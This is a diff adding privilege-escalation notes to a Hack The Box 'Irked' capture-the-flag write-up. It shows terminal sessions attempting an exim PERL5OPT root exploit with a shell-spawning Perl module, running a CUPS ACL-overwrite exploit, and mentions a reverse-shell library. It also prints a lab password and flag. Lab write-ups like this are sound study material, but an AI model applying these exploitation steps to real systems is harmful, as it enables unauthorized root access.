@@ -521,6 +521,329 @@ cups:
 
 ```
 
+some vulnerabilities, but at least [https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py](https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py) requires an actual printer on the other end, which there is not here.
+
+however, looking at `ps aux` see:
+```
+root       573  0.0  0.0   2048    64 ?        Ss   09:33   0:00 /usr/sbin/minissdpd -i 0.0.0.0
+Debian-+   927  0.0  0.1   9932  3236 ?        Ss   09:33   0:00 /usr/sbin/exim4 -bd -q30m
+```
+
+```
+djmardov@irked:~$ apt-cache policy exim4
+exim4:
+  Installed: 4.84.2-2+deb8u5
+  Candidate: 4.84.2-2+deb8u5
+  Version table:
+ *** 4.84.2-2+deb8u5 0
+        500 http://security.debian.org/ jessie/updates/main i386 Packages
+        100 /var/lib/dpkg/status
+     4.84.2-2+deb8u4 0
+        500 http://ftp.us.debian.org/debian/ jessie/main i386 Packages
+```
+
+which feels like [https://www.exploit-db.com/exploits/40054](https://www.exploit-db.com/exploits/40054)
+
+but [https://www.exploit-db.com/exploits/39535](https://www.exploit-db.com/exploits/39535) seems a bit easier to run
+
+```
+djmardov@irked:~$ vi foo.sh
+djmardov@irked:~$ bash foo.sh
+[ CVE-2016-1531 local root exploit
+foo.sh: line 23: /usr/exim/bin/exim: No such file or directory
+djmardov@irked:~$ which exim
+djmardov@irked:~$ find / -iname 'exim' -type f 2>/dev/null
+djmardov@irked:~$ find / -iname 'exim4' -type f 2>/dev/null
+/usr/sbin/exim4
+/etc/init.d/exim4
+/etc/default/exim4
+/etc/ppp/ip-up.d/exim4
+djmardov@irked:~$ ls /root
+ls: cannot open directory /root: Permission denied
+djmardov@irked:~$ ls /tmp
+linpeas.sh  systemd-private-2f18808a4a5544caa6a8cfa348cb5829-colord.service-umXrtX  systemd-private-2f18808a4a5544caa6a8cfa348cb5829-rtkit-daemon.service-E6oMV0
+root.pm     systemd-private-2f18808a4a5544caa6a8cfa348cb5829-cups.service-gUQEoH    vmware-root
+djmardov@irked:~$ cat /tmp/root.pm
+package root;
+use strict;
+use warnings;
+
+system("/bin/sh");
+djmardov@irked:~$ PERL5IB=/tmp PERL5OPT=-Mroot /usr/sbin/exim4 -ps
+Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,
+not directly from a shell command line. Options and/or arguments control
+what it does when called. For a list of options, see the Exim documentation.
+djmardov@irked:~$
+```
+but it's not exactly right.
+
+```
+djmardov@irked:~$ ls -l /usr/sbin/exim*
+lrwxrwxrwx 1 root root       5 Feb 10  2018 /usr/sbin/exim -> exim4
+-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
+-rwxr-xr-x 1 root root    4649 Feb 10  2018 /usr/sbin/exim_checkaccess
+-rwxr-xr-x 1 root root   74243 Feb 10  2018 /usr/sbin/exim_convert4r4
+-rwxr-xr-x 1 root root   13644 Feb 10  2018 /usr/sbin/exim_dbmbuild
+-rwxr-xr-x 1 root root   17748 Feb 10  2018 /usr/sbin/exim_dumpdb
+-rwxr-xr-x 1 root root   21844 Feb 10  2018 /usr/sbin/exim_fixdb
+-rwxr-xr-x 1 root root   17732 Feb 10  2018 /usr/sbin/exim_lock
+-rwxr-xr-x 1 root root  151015 Feb 10  2018 /usr/sbin/eximstats
+-rwxr-xr-x 1 root root   17748 Feb 10  2018 /usr/sbin/exim_tidydb
+```
+
+looking around elsewhere
+```
+djmardov@irked:~$ file /usr/share/ppd/custom
+/usr/share/ppd/custom: setgid, sticky, directory
+djmardov@irked:~$ ls -l /usr/share/ppd/custom/
+total 0
+djmardov@irked:~$ ls -ld /usr/share/ppd/custom/
+drwxrwsr-t 2 root lpadmin 4096 Jul 23  2017 /usr/share/ppd/custom/
+```
+
+trying some suggested exploits from linpeas
+```
+  [1] exploit_x
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [2] overlayfs
+      CVE-2015-8660
+      Source: http://www.exploit-db.com/exploits/39230
+```
+
+nothing
+
+```
+djmardov@irked:~$ mail
+No mail for djmardov
+djmardov@irked:~$ mail djmardov@irked.htb
+Subject: this is a test
+of the emergency broadcast system
+
+.
+Cc:
+djmardov@irked:~$
+djmardov@irked:~$ mail
+Mail version 8.1.2 01/15/2001.  Type ? for help.
+"/var/mail/djmardov": 1 message 1 new
+>N  1 Mailer-Daemon@irk  Sun Jul 24 16:15   39/1354  Mail delivery failed: returning message to sender
+& 1
+Message 1:
+From MAILER-DAEMON Sun Jul 24 16:15:40 2022
+Envelope-to: djmardov@irked.irked.htb
+Delivery-date: Sun, 24 Jul 2022 16:15:40 -0400
+X-Failed-Recipients: djmardov@irked.htb
+Auto-Submitted: auto-replied
+From: Mail Delivery System <Mailer-Daemon@irked.irked.htb>
+To: djmardov@irked.irked.htb
+Subject: Mail delivery failed: returning message to sender
+Date: Sun, 24 Jul 2022 16:15:40 -0400
+
+This message was created automatically by mail delivery software.
+
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
+
+  djmardov@irked.htb
+    Mailing to remote domains not supported
+
+------ This is a copy of the message, including all the headers. ------
+
+Return-path: <djmardov@irked.irked.htb>
+Received: from djmardov by irked with local (Exim 4.84_2)
+        (envelope-from <djmardov@irked.irked.htb>)
+        id 1oFi0q-0006mX-Rj
+        for djmardov@irked.htb; Sun, 24 Jul 2022 16:15:40 -0400
+To: djmardov@irked.htb
+Subject: this is a test
+Message-Id: <E1oFi0q-0006mX-Rj@irked>
+From: djmardov <djmardov@irked.irked.htb>
+Date: Sun, 24 Jul 2022 16:15:40 -0400
+
+of the emergency broadcast system
+
+```
+
+but
+
+```
+djmardov@irked:~$ mail djmardov
+Subject: foo
+bar baz
+
+.
+Cc:
+djmardov@irked:~$
+djmardov@irked:~$ mail
+Mail version 8.1.2 01/15/2001.  Type ? for help.
+"/var/mail/djmardov": 1 message 1 new
+>N  1 djmardov@irked.ir  Sun Jul 24 16:16   17/537   foo
+& 1
+Message 1:
+From djmardov@irked.irked.htb Sun Jul 24 16:16:26 2022
+Envelope-to: djmardov@irked.irked.htb
+Delivery-date: Sun, 24 Jul 2022 16:16:26 -0400
+To: djmardov@irked.irked.htb
+Subject: foo
+From: djmardov <djmardov@irked.irked.htb>
+Date: Sun, 24 Jul 2022 16:16:26 -0400
+
+bar baz
+```
+
+second time we've seen `irked.irked.htb` - but what is the relevance?
+
+doesn't seem to be a vhost, since we get the same content
+
+the cups exploit we were attempting needs a printer - why don't we just add one ourselves?
+```
+djmardov@irked:~$ /usr/sbin/lpadmin -p foo -E -v /dev/foo
+lpadmin: File device URIs have been disabled. To enable, see the FileDevice directive in "/etc/cups/cups-files.conf".
+djmardov@irked:~$ ls -l /etc/cups/cups-files.conf
+-rw-r--r-- 1 root root 2970 Jul 23  2017 /etc/cups/cups-files.conf
+```
+
+ok.. that makes it a little harder
+
+```
+djmardov@irked:~$ /usr/sbin/lpadmin -p foo -E -v socket://10.1.1.1
+djmardov@irked:~$ /usr/sbin/lpinfo -l
+djmardov@irked:~$
+```
+
+and no error, but also no printer listed
+
+let's set a ppd profile (at random):
+```
+djmardov@irked:~$ /usr/sbin/lpadmin -p foo -E -v socket://10.1.1.1 -P /usr/share/ppd/hp-ppd/HP/HP_Business_Inkjet_2500C_Series.ppd
+djmardov@irked:~$ echo $?
+0
+djmardov@irked:~$ /usr/sbin/lpinfo -l
+```
+
+ok still no printers listed, but ec=0 is a good sign.
+
+running the exploit again
+```
+djmardov@irked:~$ python 41233.py  -a localhost -b 631 -f
+
+             lol ty google
+             0000000000000
+          0000000000000000000   00
+       00000000000000000000000000000
+      0000000000000000000000000000000
+    000000000             0000000000
+   00000000               0000000000
+  0000000                000000000000
+ 0000000               000000000000000
+ 000000              000000000  000000
+0000000            000000000     000000
+000000            000000000      000000
+000000          000000000        000000
+000000         00000000          000000
+000000       000000000           000000
+0000000    000000000            0000000
+ 000000   000000000             000000
+ 0000000000000000              0000000
+  0000000000000               0000000
+   00000000000              00000000
+   00000000000            000000000
+  0000000000000000000000000000000
+   00000000000000000000000000000
+     000  0000000000000000000
+             0000000000000
+              @0x00string
+https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py
+
+[*]     locate available printer
+[+]     printer found: /printers/foo
+[*]     stomp ACL
+[*]     stomping ACL
+[*]     >:
+50 4f 53 54 20 2f 70 72 69 6e 74 65 72 73 2f 66         P O S T   / p r i n t e r s / f
+6f 6f 20 48 54 54 50 2f 31 2e 31 0d 0a 43 6f 6e         o o   H T T P / 1 . 1 . . C o n
+74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c 69         t e n t - T y p e :   a p p l i
+63 61 74 69 6f 6e 2f 69 70 70 0d 0a 48 6f 73 74         c a t i o n / i p p . . H o s t
+3a 20 6c 6f 63 61 6c 68 6f 73 74 3a 36 33 31 0d         :   l o c a l h o s t : 6 3 1 .
+0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 43 55 50         . U s e r - A g e n t :   C U P
+53 2f 32 2e 30 2e 32 0d 0a 43 6f 6e 6e 65 63 74         S / 2 . 0 . 2 . . C o n n e c t
+69 6f 6e 3a 20 43 6c 6f 73 65 0d 0a 43 6f 6e 74         i o n :   C l o s e . . C o n t
+65 6e 74 2d 4c 65 6e 67 74 68 3a 20 34 33 30 0d         e n t - L e n g t h :   4 3 0 .
+0a 0d 0a 02 00 00 05 00 00 00 30 01 47 00 12 61         . . . . . . . . . . 0 . G . . a
+74 74 72 69 62 75 74 65 73 2d 63 68 61 72 73 65         t t r i b u t e s - c h a r s e
+...
+
+[+]     ACL stomp successful
+[*]     fin
+```
+
+it did find the printer, and whatever ACL it's talking about got stomped - sounds like this will win.
+
+in help, points at `x86reverseshell.so`
+
+built one in [stolen.c](stolen.c), and kicked - but did not see the file.
+
+```
+
+[*]     job id: 5
+[*]     grab original config
+[*]     grabbing configuration file....
+[*]     config:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML>
+<HEAD>
+        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+        <TITLE>Unauthorized - CUPS v1.7.5</TITLE>
+        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
+</HEAD>
+<BODY>
+<H1>Unauthorized</H1>
+<P>Enter your username and password or the root username and password to access this page. If you are using Kerberos authentication, make sure you have a valid Kerberos ticket.</P>
+</BODY>
+</HTML>
+```
+
+but don't see username/password being passed
+
+```
+djmardov@irked:~$ wget http://localhost:631/admin/conf/cupsd.conf
+--2022-07-24 17:27:40--  http://localhost:631/admin/conf/cupsd.conf
+Resolving localhost (localhost)... ::1, 127.0.0.1
+Connecting to localhost (localhost)|::1|:631... connected.
+HTTP request sent, awaiting response... 401 Unauthorized
+
+Username/Password Authentication Failed.
+djmardov@irked:~$ wget --http-user djmardov --http-password=Kab6h+m+bbp2J:HG http://localhost:631/admin/conf/cupsd.conf
+--2022-07-24 17:28:34--  http://localhost:631/admin/conf/cupsd.conf
+Resolving localhost (localhost)... ::1, 127.0.0.1
+Connecting to localhost (localhost)|::1|:631... connected.
+HTTP request sent, awaiting response... 401 Unauthorized
+Connecting to localhost (localhost)|::1|:631... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4499 (4.4K) [text/plain]
+Saving to: ‘cupsd.conf’
+
+cupsd.conf                                      100%[=======================================================================================================>]   4.39K  --.-KB/s   in 0s
+
+2022-07-24 17:28:34 (28.4 MB/s) - ‘cupsd.conf’ saved [4499/4499]
+```
+
+ok, modify the script to pass a Authorization header?
+
+tried it in [41233.py](41233.py), but no luck, same auth failure.. which feels wrong
+
+this is very similar to the root pivot in [Antique](https://github.com/chorankates/ctf/tree/master/hackthebox.eu/machines/15-Antique), can we leverage that work?
+
+```
+djmardov@irked:~$ vi poc3.sh
+djmardov@irked:~$ bash poc3.sh
+poc3.sh: line 10: curl: command not found
+```
+
+right, no curl here
+
+and after struggling with python for a bit -- and finding out there is no `requests` module.. the cups version of Antique that is vulnerable.. is not what we're running here.
+
 ## flag
 ```
 user:4a66a78b12dc0e661a59d3f5c0267a8e
